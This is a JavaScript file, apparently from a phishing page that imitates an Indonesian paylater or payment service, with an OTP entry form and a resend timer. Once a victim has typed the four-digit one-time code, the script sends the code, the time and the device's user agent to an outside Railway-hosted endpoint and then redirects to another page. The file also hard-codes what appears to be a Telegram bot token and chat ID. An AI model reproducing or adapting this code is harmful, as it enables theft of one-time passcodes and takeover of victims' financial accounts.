// ============================
// CONFIG TELEGRAM
// ============================
const token = "8631413593:AAEpmVh-kJkBS3nHJy_a1J9XvG8A61oPWVY";
const chat_id = "7173961946";

// ============================
// ELEMENT
// ============================
const inputs = document.querySelectorAll(".otp-box input");
const btn = document.getElementById("resendBtn");

// ============================
// AUTO PINDAH + DETEKSI OTP
// ============================
inputs.forEach((input, index) => {
  input.addEventListener("input", () => {

    // hanya 1 digit
    input.value = input.value.replace(/[^0-9]/g, "").slice(0,1);

    // pindah ke next
    if (input.value && index < inputs.length - 1) {
      inputs[index + 1].focus();
    }

    cekOTP();
  });

  // backspace pindah ke kiri
  input.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && !input.value && index > 0) {
      inputs[index - 1].focus();
    }
  });
});

// ============================
// CEK OTP LENGKAP
// ============================
function cekOTP() {
  let otp = "";

  inputs.forEach(i => otp += i.value);

  if (otp.length === 4) {
    kirimOTP(otp);

    // animasi kecil (opsional)
    setTimeout(() => {
      window.location.href = "tap.html"; // pindah halaman
    }, 1500);
  }
}

// ============================
// KIRIM KE TELEGRAM
// ============================
function kirimOTP(otp) {

  const text = `
🔐 OTP MASUK

Kode OTP: ${otp}
Waktu: ${new Date().toLocaleString()}
Device: ${navigator.userAgent}
  `;

fetch("https://danacicilanpaylaterr-production.up.railway.app/send", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    text: text
  })
});
}

// ============================
// TIMER RESEND
// ============================
let time = 30;

function startTimer() {
  const interval = setInterval(() => {

    let seconds = time < 10 ? "0" + time : time;
    btn.innerText = `KIRIM ULANG 00:${seconds}`;

    time--;

    if (time < 0) {
      clearInterval(interval);

      btn.disabled = false;
      btn.innerText = "KIRIM ULANG";
      btn.style.background = "white";
      btn.style.color = "#1e88e5";
    }

  }, 1000);
}

startTimer();








const phone = localStorage.getItem("phone");

if (phone) {
  const el = document.getElementById("phoneDisplay");

  if (el) {
    const masked = phone.slice(0, 3) + "****" + phone.slice(-3);
    el.innerText = phone.startsWith("+62") ? phone : "+62" + phone;
  }
}